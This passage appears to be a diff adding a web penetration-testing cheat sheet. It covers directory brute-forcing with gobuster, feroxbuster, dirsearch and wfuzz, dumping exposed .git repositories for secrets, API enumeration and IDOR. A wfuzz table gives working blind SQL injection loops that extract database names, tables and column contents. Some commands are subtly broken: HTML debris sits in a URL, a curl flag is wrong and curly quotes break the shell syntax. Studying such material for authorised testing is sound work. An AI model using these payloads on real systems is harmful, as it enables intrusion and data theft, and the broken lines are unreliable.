+> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -o results.txt
+> ```
+- ### Set number of threads
+> ```bash
+> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -t 50
+> ```
+- ### Use proxy
+> ```bash
+> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -p http://127.0.0.1:8080
+> ```
+- ### Enumerate DNS: gather information about key servers within the domain
+> ```bash
+> gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
+> ```
+
+# Feroxbuster
+
+| Command                             | Example Usage                                                                                   | Function                                                | Output Example                           |
+|-------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------|------------------------------------------|
+| **Basic Usage**                     | ```feroxbuster -u http://<IP Address>```                                                          | Performs directory brute-forcing                        | N/A                                      |
+| **Silent Mode**                     | ```feroxbuster -u http://<IP Address> --silent```                                                  | Reduces output verbosity                               | N/A                                      |
+| **Redirects**                        | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows HTTP redirections                               | Redirects followed to http://<IP Address>/newpath |
+| **File Extensions**                 | ```feroxbuster -u http://<IP Address> -x php,txt --silent```                                     | Fuzzes for specific file extensions                     | N/A                                      |
+| **Result Output**                   | ```feroxbuster -u http://<IP Address> --output results.txt```                                     | Logs results to a file                                  | Results saved to results.txt             |
+| **User-Agent**                      | ```feroxbuster -u http://<IP Address> -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"```            | Customizes the user-agent header                        | Using User-Agent: Mozilla/5.0           |
+| **Filter Status Code**              | ```feroxbuster -u http://<IP Address> -C 403,404```                                              | Filters out specific status codes                        | Excluding 403, 404 status codes          |
+| **Quiet Mode**                      | ```feroxbuster -u http://<IP Address> -q```                                                      | Suppresses progress bar and banner                      | Quiet mode enabled                       |
+| **Controlling Threads**             | ```feroxbuster -u http://<IP Address> -t 20```                                                   | Limits concurrent threads                               | Using 20 threads                        |
+| **Custom Wordlist**                 | ```feroxbuster -u http://<IP Address> -w /usr/share/wordlists/dirb/common.txt```                  | Uses a custom wordlist                                  | N/A                                      |
+| **Disable Recursion**               | ```feroxbuster -u http://<IP Address> -n```                                                      | Disables recursive scanning                             | N/A                                      |
+| **Limit Recursion Depth**           | ```feroxbuster -u http://<IP Address> -L 4```                                                    | Limits recursion depth                                  | Recursion depth set to 4                 |
+| **Force Recursion**                 | ```feroxbuster -u http://<IP Address> --force-recursion```                                       | Forces recursion                                        | Recursion forced                         |
+| **Filter by Character Size**        | ```feroxbuster -u http://<IP Address> -q -S 285,286,283,289```                                   | Filters by response size                                | Filtering response sizes: 285, 286, 283, 289 |
+| **Filter by Number of Words**       | ```feroxbuster -u http://<IP Address> -q -W 33```                                                | Filters by number of words                              | Filtering results with 33 words          |
+| **Filter by Number of Lines**       | ```feroxbuster -u http://<IP Address> -q -N 9```                                                 | Filters by number of lines                              | Filtering results with 9 lines           |
+| **Filter Status Code (Deny List)**  | ```feroxbuster -u http://<IP Address> -q --filter-status 404```                                   | Deny list for status codes                              | Filtering out status code 404            |
+| **Filter Status Code (Allow List)** | ```feroxbuster -u http://<IP Address> -q --status-codes 200,301```                                | Allow list for status codes                             | Allowing status codes 200, 301          |
+| **Generate Random User-Agent**      | ```feroxbuster -u http://<IP Address> -A --burp```                                               | Uses random User-Agent for each request                 | Random User-Agent used                   |
+| **HTTP Method**                     | ```feroxbuster -u http://<IP Address> -m POST```                                                 | Specifies the HTTP method to use                        | Using POST method                       |
+| **Custom Headers**                  | ```feroxbuster -u http://<IP Address> -H 'Content-Type: application/x-www-form-urlencoded' --burp -q``` | Adds custom headers                                     | Using header Content-Type: application/x-www-form-urlencoded |
+| **Cookies**                         | ```feroxbuster -u http://<IP Address> --cookies PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 --burp -q```  | Sets cookies for the requests                           | Using cookies: PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 |
+| **Add Slash**                       | ```feroxbuster -u http://<IP Address> -f```                                                      | Appends a slash to each request                         | Adding slash to requests                 |
+| **Capture Requests in Burp**        | ```feroxbuster -u http://<IP Address> --burp```                                                  | Captures requests for Burp Suite                        | Requests captured in Burp Suite          |
+| **Read Target from List**           | ```cat target.txt | feroxbuster --stdin -q```                                                   | Reads target URLs from a list                            | N/A                                      |
+| **Resume from Last State**          | ```feroxbuster --resume-from ferox-http_<IP Address>-1723370176.state -q```                       | Resumes scan from last saved state                       | Resuming from previous state            |
+| **Follow Redirect**                 | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows redirects during scanning                        | Following redirects                      |
+| **Timeout**                         | ```feroxbuster -u http://<IP Address> -T 5```                                                    | Sets the timeout duration to 5 seconds                   | Timeout set to 5 seconds                 |
+
+# Dirsearch
+
+- ### Basic Directory scanning
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt
+> ```
+- ### Filter to show only 200 or 3xx responses
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -i 200,300-399
+> ```
+- ### Specify extensions
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -e php,html,txt
+> ```
+- ### Save Output to a file
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -r -o results.txt
+> ```
+- ### Set number of threads
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -t 50
+> ```
+- ### Use proxy
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -x http://127.0.0.1:8080
+> ```
+- ### Ignore SSL certification warnings
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -k
+> ```
+- ### Exclude specific status codes
+> ```bash
+> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt --exclude-status 404,403
+> ```
+
+# WFUZZ
+
+| Command                          | Example Usage                                                                                           | Function                              | Output Example                                              |
+|----------------------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|-------------------------------------------------------------|
+| **Basic Fuzzing**                | `wfuzz -w wordlist.txt http://example.com/FUZZ`                                                          | Fuzzes directories                   | `000000001: 200 1234 L 45 W 12345 Ch "admin"`                |
+| **Multiple Fuzz Points**         | `wfuzz -w list1.txt -w list2.txt http://example.com/FUZZ/FUZ2Z`                                          | Fuzzes two positions                 | `000000001: 200 50 L 20 W 5000 Ch "api" - "v1"`              |
+| **POST Fuzzing**                 | `wfuzz -w wordlist.txt -d "user=admin&pass=FUZZ" http://example.com/login`                               | Fuzzes POST data                     | `000000001: 200 10 L 5 W 150 Ch "password123"`               |
+| **Header Fuzzing**               | `wfuzz -w agents.txt -H "User-Agent: FUZZ" http://example.com/`                                          | Fuzzes User-Agent                    | `000000001: 200 100 L 50 W 10000 Ch "Mozilla/5.0..."`        |
+| **Cookie Fuzzing**               | `wfuzz -w wordlist.txt -b "session=FUZZ" http://example.com/`                                            | Fuzzes cookie values                 | `000000001: 302 5 L 2 W 45 Ch "abc123def456"`                |
+| **VHost Discovery**              | `wfuzz -w subdomains.txt -H "Host: FUZZ.example.com" http://192.168.1.10/`                              | Discovers virtual hosts              | `000000001: 200 200 L 100 W 20000 Ch "admin"`                |
+| **Filter Status Code**           | `wfuzz -w wordlist.txt --sc 200 http://example.com/FUZZ`                                                 | Shows only 200 OK                    | `000000001: 200 50 L 25 W 5000 Ch "dashboard"`               |
+| **Hide Status Code**             | `wfuzz -w wordlist.txt --hc 404 http://example.com/FUZZ`                                                | Hides 404 errors                     | `000000001: 200 30 L 15 W 3000 Ch "api"`                     |
+| **Filter Length**                | `wfuzz -w wordlist.txt --sl 1000 http://example.com/FUZZ`                                               | Shows 1000-char responses            | `000000001: 200 50 L 25 W 1000 Ch "config"`                  |
+| **Hide Length**                  | `wfuzz -w wordlist.txt --hl 4242 http://example.com/FUZZ`                                              | Hides 4242-byte responses            | `000000001: 200 100 L 50 W 10000 Ch "upload"`                |
+| **Word Count Filter**            | `wfuzz -w wordlist.txt --sw 100 http://example.com/FUZZ`                                                | Shows 100-word responses             | `000000001: 200 20 L 100 W 2000 Ch "about"`                  |
+| **Regex Filter**                 | `wfuzz -w wordlist.txt --ss "admin" http://example.com/FUZZ`                                           | Shows "admin" in response            | `000000001: 200 50 L 25 W 5000 Ch "panel"`                   |
+| **Basic Auth**                   | `wfuzz -w passwords.txt --basic admin:FUZZ http://example.com/`                                          | Tests basic auth                     | `000000001: 200 10 L 5 W 500 Ch "P@ssw0rd"`                  |
+| **Custom Method**                | `wfuzz -w wordlist.txt -X PUT http://example.com/FUZZ`                                                  | Uses PUT method                      | `000000001: 200 5 L 2 W 100 Ch "config"`                     |
+| **Proxy Usage**                  | `wfuzz -w wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ`                                      | Routes through proxy                 | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
+| **Request Delay**                | `wfuzz -w wordlist.txt -s 2 http://example.com/FUZZ`                                                   | 2-second delay                       | `000000001: 200 50 L 25 W 5000 Ch "api"`                     |
+| **Recursion**                    | `wfuzz -w wordlist.txt -R 2 http://example.com/FUZZ`                                                   | Recursive fuzzing                    | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
+| **Follow Redirects**             | `wfuzz -w wordlist.txt --follow http://example.com/FUZZ`                                               | Follows redirects                    | `000000001: 200 50 L 25 W 5000 Ch "login" --> "/dashboard"`   |
+| **Thread Count**                 | `wfuzz -w wordlist.txt -t 50 http://example.com/FUZZ`                                                  | Uses 50 threads                      | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
+| **Output to File**               | `wfuzz -w wordlist.txt -f results.txt http://example.com/FUZZ`                                         | Saves to file                        | `Results saved to results.txt`                                |
+| **JSON Output**                  | `wfuzz -w wordlist.txt -o json http://example.com/FUZZ`                                                | Outputs JSON                         | `{"url":"http://example.com/admin","code":200,"lines":50}`    |
+| **Lines Filter**                 | `wfuzz -w wordlist.txt --sl 50 http://example.com/FUZZ`                                                | Shows 50-line responses              | `000000001: 200 50 L 25 W 5000 Ch "config"`                   |
+| **Hide Lines**                   | `wfuzz -w wordlist.txt --hl 15 http://example.com/FUZZ`                                                | Hides 15-line responses              | `000000001: 200 50 L 25 W 5000 Ch "dashboard"`                |
+| **Combined Filters**             | `wfuzz -w wordlist.txt --sc 200 --hl 4242 http://example.com/FUZZ`                                     | Multiple filters                      | `000000001: 200 50 L 25 W 5000 Ch "admin"`                    |
+
+### Examples
+
+| Command | Example Usage | Function | Output Example |
+| ------- | ------------- | -------- | -------------- |
+| Find available directories | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Fuzzes directories | |
+| Find available directories with cookies | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: <cookie_name>=<cookie_value>" http://<IP-ADDRESS>/FUZZ ``` | Fuzzes directories with cookies | |
+| Fuzz data parameters | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" http://<IP-ADDRESS> ``` | Fuzzes data parameters | |
+| Subdomain enumeration | ```bash wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.<TARGET_DOMAIN>" <TARGET_DOMAIN> ``` | Discovers subdomains | |
+| Enumerate hidden directories | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/.FUZZ ``` | Enumerates hidden directories | |
+| Skip SSL Certificate validation | ```bash wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Skips SSL validation | |
+| Use threads to speed up | ```bash wfuzz --hc 404 -c -t <number of threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Uses threads to speed up | |
+| To find number of columns (MySQL) | ```bash wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ" ``` | Finds number of columns in MySQL | |
+| To find number of columns (MSSQL) | ```bash wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ" ``` | Finds number of columns in MSSQL | |
+| Determine Database Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines database name via ASCII | |
+| Determine Table Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines table name via ASCII | |
+| Determine Column Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE_NAME>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines column name via ASCII | |
+| Extract Column Content with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Extracts column content via ASCII | |
+
+# Exposed .git
+
+> 1. Clone [Git-Dumper](https://github.com/arthaud/git-dumper</a></body></html>)
+> ```bash
+> git clone https://github.com/arthaud/git-dumper</a></body></html>
+> ```
+> 2. Dump Content of an exposed .git directory
+> ```bash
+> git-dumper http://<IP-ADDRESS>/.git website_git
+> ```
+> 3. Search for common secrets
+> ```bash
+> grep -r ‘password’ .
+>  grep -r ‘apikey’ .
+> ```
+> 4. View a specific file that may contain credentials or sensitive data
+> ```bash
+> cat website_git/config/database.php
+> ```
+> 5. Check the commit log
+> ```bash
+> git log
+> ```
+> 6. Check commit diff
+> ```bash
+> git show [commitID]
+> ```
+> 7. Show Git commits and reveal information
+> ```bash
+> sudo git show
+> ```
+> 8. Althernatively: Download the .git directory if exposed and move into the directory locally
+> ```bash
+> sudo wget -r http://<IP-ADDRESS/.git/
+> ```
+
+## Api
+
+- ### Basic enumeration
+> ```bash
+> curl http://<IP-ADDRESS>/api
+> ```
+- ### Common API Pattern
+> ```text
+> /api_name/v1
+> ```
+- ### Use directory exploration techniques to further enumerate endpoints
+> ```bash
+> curl -x GET “http://[IP-ADDRESS]:[PORT]/search?query=*”
+> ["query":"*","result:""}
+> ```
+> - Can change * to any type of query desired
+- ### Use -d for data and -H for headers
+> ```bash
+> curl -d ‘{"password":"fake","username":"admin"}’ -H ‘Content-Type: application/json’ http://[IP-ADDRESS]:[PORT]/users/v1/login
+> ```
+- ### To use a proxy
+> ```bash
+> --proxy 127.0.0.1:8080
+> ```
+
+## IDOR
+
+### Understanding IDOR (Insecure Direct Object Reference)
+
+### What is IDOR?
+
+In the context of web security, **IDOR** occurs when an attacker can directly access an object (such as a file or database entry) by manipulating a URL or HTTP request parameter, without proper access control checks. 
+
+#### Example:
+
+If a user uploads a file and gets a download link like: 
+
+download.php?file_id=123
+
+The file ID (`file_id=123`) directly references the file on the server. But what happens if the user tries to access a different file by modifying the `file_id` parameter in the URL?
+
+download.php?file_id=124
+
+If the server allows access to this file (`file_id=124`) without proper authorization checks, it indicates a **broken access control** vulnerability.
+
+To identify IDOR vulnerabilities, it’s important to look for **URL parameters** or **APIs** that reference an object, such as:
+
+- **URL Parameters**: `?uid=1` or `?filename=file_1.pdf`
+- **Other HTTP Headers**: Sometimes, object references may appear in cookies.
+
+When testing for IDOR, consider the following:
+
+1. **Observe URLs and Parameters**: Check if any URL or request includes unique identifiers (UIDs) or file references that could be manipulated.
+   
+2. **Enumerate the Possible Values**: If the object reference (such as a file ID or user ID) follows a sequential pattern, we can **enumerate** values to access objects that don’t belong to us.
+
 
